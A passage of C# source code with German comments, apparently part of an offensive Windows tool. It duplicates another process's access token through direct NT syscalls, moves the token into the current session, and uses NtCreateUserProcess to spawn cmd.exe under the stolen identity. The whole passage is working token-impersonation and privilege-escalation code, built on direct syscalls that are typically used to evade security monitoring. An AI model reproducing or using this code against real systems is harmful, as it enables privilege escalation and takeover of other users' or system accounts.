                if (Console.ReadKey().Key != ConsoleKey.Y)
                {
                    Console.WriteLine("\n[-] Aborted by user");
                    _NtClose(hTargetToken);
                    _NtClose(hProcess);
                    return;
                }
                Console.WriteLine();
            }

            // 4. Token duplizieren mit NtDuplicateToken
            OBJECT_ATTRIBUTES dupAttr = OBJECT_ATTRIBUTES.Create();
            status = _NtDuplicateToken(hTargetToken, 0xF01FF, ref dupAttr, false, 1, out IntPtr hPrimaryToken);
            if (status != 0 || hPrimaryToken == IntPtr.Zero)
            {
                Console.WriteLine($"[-] NtDuplicateToken failed: 0x{status:X8}");
                _NtClose(hTargetToken);
                _NtClose(hProcess);
                return;
            }
            Console.WriteLine("[+] Primary token duplicated via NtDuplicateToken");

            // 5. Session Handling: Token in aktuelle Session bringen via NtSetInformationToken
            int currentSession = GetTokenSessionId(currentIdentity.Token);
            if (targetSession != currentSession && targetSession != 0)
            {
                Console.WriteLine($"[*] Adjusting token session from {targetSession} to {currentSession}");
                IntPtr pSessionId = Marshal.AllocHGlobal(sizeof(int));
                Marshal.WriteInt32(pSessionId, currentSession);
                status = _NtSetInformationToken(hPrimaryToken, (int)TOKEN_INFORMATION_CLASS.TokenSessionId, pSessionId, (uint)sizeof(int));
                Marshal.FreeHGlobal(pSessionId);
                if (status != 0)
                {
                    Console.WriteLine($"[!] Session adjustment failed: 0x{status:X8}");
                }
                else
                {
                    Console.WriteLine("[+] Session adjusted");
                }
            }

            // 6. Prozess erstellen via NtCreateUserProcess (vollständiger Syscall)
            //    Dazu benötigen wir ProcessParameters
            string cmdPath = Environment.SystemDirectory + @"\cmd.exe";
            IntPtr pParams = CreateProcessParameters(cmdPath, "cmd.exe");
            if (pParams == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to create process parameters");
            }
            else
            {
                OBJECT_ATTRIBUTES procAttr = OBJECT_ATTRIBUTES.Create();
                OBJECT_ATTRIBUTES threadAttr = OBJECT_ATTRIBUTES.Create();

                IntPtr hNewProcess = IntPtr.Zero;
                IntPtr hNewThread = IntPtr.Zero;

                var _NtCreateUserProcess = SyscallAPI.GetSyscall<NtCreateUserProcess>("NtCreateUserProcess");
                if (_NtCreateUserProcess != null)
                {
                    status = _NtCreateUserProcess(ref hNewProcess, ref hNewThread, 0x1FFFFF, 0x1FFFFF,
                        ref procAttr, ref threadAttr, 0, 0, pParams, IntPtr.Zero, IntPtr.Zero);

                    if (status == 0 && hNewProcess != IntPtr.Zero)
                    {
                        Console.WriteLine($"[+] cmd.exe started via NtCreateUserProcess! PID: {GetProcessIdNative(hNewProcess)}");
                        _NtClose(hNewProcess);
                        if (hNewThread != IntPtr.Zero) _NtClose(hNewThread);
                    }
                    else
                    {
                        Console.WriteLine($"[-] NtCreateUserProcess failed: 0x{status:X8}");
                    }
                }

                // ProcessParameters freigeben
                var _RtlDestroyProcessParameters = SyscallAPI.GetSyscall<RtlDestroyProcessParameters>("RtlDestroyProcessParameters");
                _RtlDestroyProcessParameters?.Invoke(pParams);
            }

            // Cleanup
            if (hPrimaryToken != IntPtr.Zero) _NtClose(hPrimaryToken);
            if (hTargetToken != IntPtr.Zero) _NtClose(hTargetToken);
            if (hProcess != IntPtr.Zero) _NtClose(hProcess);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[-] Error: {ex.Message}");
            Console.WriteLine(ex.StackTrace);
        }

        Console.WriteLine("\n[*] Press any key to exit...");
        Console.ReadKey();
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern int GetProcessId(IntPtr process);

    private static int GetProcessIdNative(IntPtr process) => GetProcessId(process);

    #endregion
}